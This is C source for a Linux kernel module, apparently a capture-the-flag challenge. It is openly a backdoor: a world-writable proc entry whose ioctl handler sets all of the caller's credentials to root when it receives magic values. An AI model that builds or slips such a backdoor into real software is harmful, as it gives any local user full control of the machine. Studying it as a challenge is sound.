#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>

MODULE_LICENSE("Proprietary");
MODULE_AUTHOR("TGHack");
MODULE_DESCRIPTION("A very PWNABLE kernel module");
MODULE_VERSION("0.01");

static struct proc_dir_entry *ent;

static long my_ioctl(struct file* f, unsigned int cmd, unsigned long arg) {
	printk(KERN_INFO "IOCTL: cmd=%u, arg=%lu\n", cmd, arg);
	if(cmd == 1942 && arg == 1992) {
		struct cred* creds = prepare_creds();
		creds->uid = KUIDT_INIT(0);
		creds->gid = KGIDT_INIT(0);
		creds->euid = KUIDT_INIT(0);
		creds->egid = KGIDT_INIT(0);
		commit_creds(creds);
	}
	return 0;
}

static struct file_operations ops = 
{
	.owner = THIS_MODULE,
	.unlocked_ioctl = my_ioctl
};

static int __init lkm_init(void) {
	ent = proc_create("my_backdoor", 0666, NULL, &ops);
	return 0;
}

static void __exit lkm_exit(void) {
	proc_remove(ent);
}

module_init(lkm_init);
module_exit(lkm_exit);
